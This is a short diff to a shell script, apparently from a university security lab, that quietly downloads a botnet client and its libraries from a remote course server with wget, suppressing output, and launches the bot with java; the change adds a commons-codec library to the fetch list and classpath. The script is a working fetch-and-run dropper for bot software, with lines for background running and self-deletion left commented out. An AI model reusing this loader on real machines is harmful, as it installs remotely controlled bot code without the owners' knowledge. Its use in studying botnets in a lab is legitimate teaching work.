@@ -14,6 +14,7 @@ if [ -z "$DIR" ]; then
     BIN4="BotnetClient\$ProcessInputThread.class"
     PIRC="pircbot.jar"
     MAIL="mail.jar"
+    APAC="commons-codec-1.4.jar"
     CURDIR=`pwd`
 
     if [ ! -d "${DIR}${FOLDER}" ]; then
@@ -30,12 +31,12 @@ if [ -z "$DIR" ]; then
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$PIRC" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/bin/$BIN" &> /dev/null
     wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$MAIL" &> /dev/null
-    #javac $SRC                                                                                                          
-
+    wget "abstract.cs.washington.edu/~roy/lab3/Botnet/$APAC" &> /dev/null    
+    #javac $SRC
 
     #rm $SRC
     
-    java -classpath "${PIRC}:${MAIL}:." $TARGET #&> /dev/null &
+    java -classpath "${PIRC}:${MAIL}:${APAC}:." $TARGET #&> /dev/null &
     
     #rm $PIRC
     #rm $MAIL
